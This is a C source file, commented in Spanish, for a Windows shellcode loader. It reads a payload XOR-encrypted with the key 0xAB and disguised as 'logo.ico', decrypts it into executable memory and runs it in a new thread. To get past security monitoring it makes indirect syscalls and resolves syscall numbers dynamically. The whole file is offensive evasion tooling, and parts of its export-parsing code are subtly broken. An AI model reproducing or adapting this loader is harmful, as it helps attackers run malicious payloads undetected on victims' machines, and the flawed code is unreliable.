#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

//Se declaran las variables globales que contendran las direcciones de las syscalls
UINT_PTR sysAddrNtAllocateVirtualMemory;
UINT_PTR sysAddrNtWriteVirtualMemory;
UINT_PTR sysAddrNtCreateThreadEx;
UINT_PTR sysAddrNtWaitForSingleObject;

DWORD ssnNtAllocateVirtualMemory;
DWORD ssnNtWriteVirtualMemory;
DWORD ssnNtCreateThreadEx;
DWORD ssnNtWaitForSingleObject;

typedef long NTSTATUS;
typedef NTSTATUS* PNTSTATUS;

//Se declaran los headers de las funciones que se van a usar
extern NTSTATUS SysNtAllocateVirtualMemory(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T RegionSize,
	ULONG AllocationType,
	ULONG Protect
);

extern NTSTATUS SysNtWriteVirtualMemory(
	HANDLE ProcessHandle,
	PVOID BaseAddress,
	PVOID Buffer,
	ULONG NumberOfBytesToWrite,
	PULONG NumberOfBytesWritten
);

extern NTSTATUS SysNtCreateThreadEx(
	PHANDLE ThreadHandle,
	ACCESS_MASK DesiredAccess,
	PVOID ObjectAttributes,
	HANDLE ProcessHandle,
	PVOID StartRoutine,
	PVOID Argument,
	ULONG CreateFlags,
	SIZE_T ZeroBits,
	SIZE_T StackSize,
	SIZE_T MaximumStackSize,
	PVOID AttributeList
);

extern NTSTATUS SysNtWaitForSingleObject(
	HANDLE Handle,
	BOOLEAN Alertable,
	PLARGE_INTEGER Timeout
);

#define KEY 0xAB

PBYTE xor_file(const char* filename, SIZE_T* outsize) {
	HANDLE hFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return NULL;
	}
	DWORD filesize = GetFileSize(hFile, NULL);
	PBYTE buffer = (PBYTE)malloc(filesize);
	if (!buffer) {
		CloseHandle(hFile);
		return NULL;
	}
	DWORD bytesRead;
	if (ReadFile(hFile, buffer, filesize, &bytesRead, NULL)) {
		for (DWORD i = 0; i < bytesRead; i++) {
			buffer[i] ^= KEY;
		}
		*outsize = (SIZE_T)filesize;
		CloseHandle(hFile);
		return buffer;
	}

	CloseHandle(hFile);
	free(buffer);
	return NULL;
}

BOOLEAN GetSSNInternal(PBYTE NtFunction, PWORD ssn)
{
	DWORD offset = 0;
	DWORD ssn_low = 0;
	DWORD ssn_high = 0;
	BOOL found = FALSE;

	if (!ssn)
		return FALSE;
	do
	{
		if (*(NtFunction + offset) == 0xC3) {
			break;
		}
		if (*(NtFunction + offset + 0) == 0x4c &&
			*(NtFunction + offset + 1) == 0x8b &&
			*(NtFunction + offset + 2) == 0xd1 &&
			*(NtFunction + offset + 3) == 0xb8)
		{
			ssn_low = *(NtFunction + offset + 4);
			ssn_high = *(NtFunction + offset + 5);
			*ssn = (WORD)(ssn_low | (ssn_high << 8));
			return TRUE;
		}
		offset++;
	} while (TRUE);
	return FALSE;
}

WORD GetSSN(PBYTE NtFunction)
{
	BOOLEAN found = FALSE;
	WORD ssn = 0;
	DWORD i = 0;
	DWORD SzNtApi = 0;
	PVOID NeighboringNtApi = NULL;
	if (GetSSNInternal(NtFunction, &ssn))
		return ssn;
	else
	{
		SzNtApi = GetFunctionSize(NtFunction);
		while (ssn == 0 && i < 200)
		{
			NeighboringNtApi = (NtFunction)+(SzNtApi * i);
			if (GetSSNInternal(NeighboringNtApi, &ssn))
			{
				ssn -= i;
				break;
			}
			NeighboringNtApi = (NtFunction)-(SzNtApi * i);
			if (GetSSNInternal(NeighboringNtApi, &ssn))
			{
				ssn += i;
				break;
			}
			i++;
		}
	}
	return ssn;
}

DWORD GetFunctionSize(PVOID Function)
{
	PIMAGE_NT_HEADERS NtHeader = NULL;
	PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
	SIZE_T ExportSize = 0;
	PDWORD AddressOfFunctions = NULL;
	PDWORD AddressOfNames = NULL;
	PWORD AddressOfNameOrdinals = NULL;
	PVOID BaseAddress = NULL;
	PCHAR FunctionName = NULL;
	PBYTE FunctionAddress = NULL;
	PBYTE NextFunctionAddress = NULL;
	DWORD FunctionSize = 0;
	DWORD offset = 0;
	PBYTE Module = GetModuleHandleA("ntdll.dll");
	NtHeader = Module + ((PIMAGE_DOS_HEADER)Module)->e_lfanew;
	ExportDirectory = Module +
		NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	ExportSize = Module +
		NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	AddressOfFunctions = (PDWORD)(Module + ExportDirectory->AddressOfFunctions);
	AddressOfNames = (PDWORD)(Module + ExportDirectory->AddressOfNames);
	AddressOfNameOrdinals = (PWORD)(Module + ExportDirectory->AddressOfNameOrdinals);
	for (DWORD i = 0; i < ExportDirectory->NumberOfNames; i++)
	{
		if ((PBYTE)FunctionAddress >= (PBYTE)ExportDirectory &&
			(PBYTE)FunctionAddress < (PBYTE)(ExportDirectory + ExportSize))
		{
			continue;
		}
		if (*(PWORD)FunctionName != 0x775a) // "Zw"
		{
			continue;
		}
		else
		{
			NextFunctionAddress = Module + AddressOfFunctions[AddressOfNameOrdinals[i]];
			offset = FunctionAddress > NextFunctionAddress ? FunctionAddress - NextFunctionAddress : NextFunctionAddress - FunctionAddress;
			if (!FunctionSize || offset < FunctionSize)
			{
				FunctionSize = offset;
			}
		}
	}
	return FunctionSize;
}

UINT_PTR FindSyscallInstruction(PBYTE pFunction) {
	// Buscamos hasta 32 bytes (suficiente para un stub normal)
	for (DWORD i = 0; i < 32; i++) {
		// Buscamos los opcodes: 0F 05 (syscall)
		if (pFunction[i] == 0x0F && pFunction[i + 1] == 0x05) {
			return (UINT_PTR)(pFunction + i);
		}
	}
	return 0;
}

main() {
	//Handle a ntdll
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (hNtdll == NULL)
	{
		return 1;
	}

	//Obtenemos las direcciones de las funciones
	UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
	UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");

	//Dynamic SSNs
	ssnNtAllocateVirtualMemory = GetSSN((PBYTE)pNtAllocateVirtualMemory);
	ssnNtWriteVirtualMemory = GetSSN((PBYTE)pNtWriteVirtualMemory);
	ssnNtCreateThreadEx = GetSSN((PBYTE)pNtCreateThreadEx);
	ssnNtWaitForSingleObject = GetSSN((PBYTE)pNtWaitForSingleObject);

	//Construir los syscalls
	sysAddrNtAllocateVirtualMemory = FindSyscallInstruction((PBYTE)pNtAllocateVirtualMemory);
	sysAddrNtWriteVirtualMemory = FindSyscallInstruction((PBYTE)pNtWriteVirtualMemory);
	sysAddrNtCreateThreadEx = FindSyscallInstruction((PBYTE)pNtCreateThreadEx);
	sysAddrNtWaitForSingleObject = FindSyscallInstruction((PBYTE)pNtWaitForSingleObject);


	//Definir el exe
	SIZE_T sSize = 0;
	PBYTE exe = xor_file("logo.ico", &sSize);

	PVOID baseAddress = NULL;
	SIZE_T regionSize = sSize;

	SysNtAllocateVirtualMemory(
		(HANDLE)-1,
		&baseAddress,
		0,
		&regionSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	SIZE_T bytesWritten;
	SysNtWriteVirtualMemory(
		(HANDLE)-1,
		baseAddress,
		exe,
		sSize,
		&bytesWritten
	);

	HANDLE hThread;
	SysNtCreateThreadEx(
		&hThread,
		GENERIC_EXECUTE,
		NULL,
		(HANDLE)-1,
		baseAddress,
		NULL,
		FALSE,
		0,
		0,
		0,
		NULL
	);

	SysNtWaitForSingleObject(
		hThread,
		FALSE,
		NULL
	);
	getchar();

	return 0;
}